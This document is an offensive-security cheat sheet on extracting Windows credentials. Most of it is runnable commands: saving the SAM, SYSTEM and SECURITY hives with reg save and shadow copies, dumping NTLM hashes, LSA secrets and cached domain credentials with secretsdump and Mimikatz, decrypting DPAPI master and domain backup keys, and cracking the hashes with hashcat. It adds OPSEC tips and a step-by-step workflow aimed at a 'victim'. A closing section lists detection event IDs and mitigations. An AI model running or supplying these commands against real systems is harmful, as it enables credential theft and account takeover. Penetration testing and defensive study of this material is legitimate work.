# <span style="color:rgb(255, 192, 0)">SAM, LSA, & DPAPI Extraction</span>

Local credential material is stored in registry hives on Windows systems. Extracting these hives allows offline cracking of local passwords, cached domain credentials, and decryption of user secrets.

| Hive | File Location | Contents |
|------|--------------|----------|
| SAM | `C:\Windows\System32\config\SAM` | Local user NTLM/LM hashes |
| SYSTEM | `C:\Windows\System32\config\SYSTEM` | Boot key (required to decrypt SAM) |
| SECURITY | `C:\Windows\System32\config\SECURITY` | Cached domain credentials, LSA secrets |
| NTDS.dit | `C:\Windows\NTDS\NTDS.dit` | Domain credential database (DC only) |

---

## <span style="color:rgb(255, 0, 0)">1. Registry Hive Extraction (Online)</span>

### Using `reg.exe` (Built-in)
```cmd
reg save hklm\sam C:\temp\sam.hiv
reg save hklm\system C:\temp\system.hiv
reg save hklm\security C:\temp\security.hiv
```

### PowerShell
```powershell
reg save hklm\sam $env:TEMP\sam.hiv
reg save hklm\system $env:TEMP\system.hiv
reg save hklm\security $env:TEMP\security.hiv
```

### Remote Registry
```cmd
reg save \\TARGET\hklm\sam C:\temp\sam.hiv
```

**OPSEC**: `reg save` is a built-in Windows utility. Process creation (4688) is normal admin activity.

---

## <span style="color:rgb(0, 176, 240)">2. Offline Extraction (Mounted Drive)</span>

### From Shadow Copy
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\
```

### From Disk Image
```bash
# Mount and extract
sudo mount -o loop,ro,show_sys_files,noatime disk_image.dd /mnt/windows
cp /mnt/windows/Windows/System32/config/SAM ~/
cp /mnt/windows/Windows/System32/config/SYSTEM ~/
cp /mnt/windows/Windows/System32/config/SECURITY ~/
```

### From Physical Access
```bash
# Boot from Linux USB, mount Windows partition
sudo mkdir /mnt/windows
sudo mount /dev/sda2 /mnt/windows
cp /mnt/windows/Windows/System32/config/SAM ~/sam.hiv
cp /mnt/windows/Windows/System32/config/SYSTEM ~/system.hiv
```

---

## <span style="color:rgb(146, 208, 80)">3. Extracting Hashes from SAM</span>

### Using secretsdump.py
```bash
# Offline SAM + SYSTEM
secretsdump.py -sam sam.hiv -system system.hiv LOCAL

# SAM + SYSTEM + SECURITY (includes cached creds)
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

### Using samdump2
```bash
# Linux
samdump2 system.hiv sam.hiv
```

### Using Mimikatz (Offline)
```mimikatz
mimikatz # lsadump::sam /sam:sam.hiv /system:system.hiv
```

### Using Impacket (Online)
```bash
secretsdump.py -hashes :HASH LocalAdmin@192.168.1.100
```

---

## <span style="color:rgb(112, 48, 160)">4. Extracting LSA Secrets</span>

LSA secrets contain auto-logon passwords, service account passwords, DPAPI keys, and cached credentials.

### secretsdump.py
```bash
# Include security hive for LSA secrets + cached domain creds
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

### Mimikatz (Online)
```mimikatz
lsadump::secrets
```

### Mimikatz (Offline)
```mimikatz
lsadump::secrets /security:security.hiv /system:system.hiv
```

### Cached Domain Credentials (MSCache v2)
```bash
# secretsdump will extract these from security.hiv
# Cache format: $DCC2$<iterations>#<username>#<hash>
hashcat -m 2100 '$DCC2$10240#user#hash' wordlist.txt
```

---

## <span style="color:rgb(0, 32, 96)">5. DPAPI Extraction</span>

DPAPI (Data Protection API) encrypts user secrets: browser passwords, certificates, VPN/RDP credentials, Wi-Fi keys, and EFS files.

### DPAPI Key Locations
```
Master Keys:  C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
Backup Keys:  DC's DPAPI backup key (for domain decryption)
```

### Extract Master Key
```mimikatz
dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-XXXX\<KEY_FILE> /sid:S-1-5-21-XXXX /password:PlaintextPass
```

### Extract DPAPI with Mimikatz (Online)
```mimikatz
# Dump all user DPAPI keys from LSASS
sekurlsa::dpapi

# Use masterkey to decrypt blob
dpapi::blob /in:ENCRYPTED_BLOB /masterkey:MASTERKEY_BLOB
```

### Domain DPAPI Backup Key
```bash
# Extract DPAPI backup key from DC (requires DA)
secretsdump.py -just-dc DOMAIN/admin:pass@DC01
# Look for: DPAPI_SYSTEM
```

```mimikatz
# Decrypt with domain backup key
dpapi::masterkey /in:FILE /sid:S-1-5-21-XXXX /rpc
```

---

## <span style="color:rgb(94, 18, 18)">6. Full Offline Workflow</span>

```bash
# Step 1: Save hives (from victim)
reg save hklm\sam sam.hiv
reg save hklm\system system.hiv
reg save hklm\security security.hiv

# Step 2: Transfer to Kali

# Step 3: Extract everything
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL -outputfile dump

# Step 4: View local hashes
cat dump.sam
# Administrator:500:LM:NTLM:::

# Step 5: View cached domain creds
cat dump.cache
# DOMAIN\User:$DCC2$10240#User#Hash

# Step 6: Crack hashes
hashcat -m 1000 dump.sam --username wordlist.txt -r best64.rule
hashcat -m 2100 dump.cache --username wordlist.txt -r best64.rule
```

---

## <span style="color:rgb(255, 255, 0)">7. Detection</span>

| Activity | Event ID | Details |
|----------|----------|---------|
| `reg save` | 4688 | Process creation with `reg.exe save` |
| Shadow copy creation | 4688 | `vssadmin.exe` execution |
| File access to config | 4656 | SAM/SYSTEM/SECURITY file handle request |
| Volume Shadow Copy | 7036 | Service start/stop for VSS |

### Sysmon Detection
```
Event ID 11 (FileCreate): SAM, SYSTEM, SECURITY files written outside config dir
Event ID 1 (ProcessCreate): reg.exe with "save" and "hklm\sam"
```

### Mitigations
| Control | Effect |
|---------|--------|
| Block reg.exe save | AppLocker/WDAC policy |
| LSA Protection | Protects some secrets |
| BitLocker with TPM | Physical offline protection |
| Credential Guard | Virtualizes LSASS keys |
| Protected Users | Cached credentials not stored |
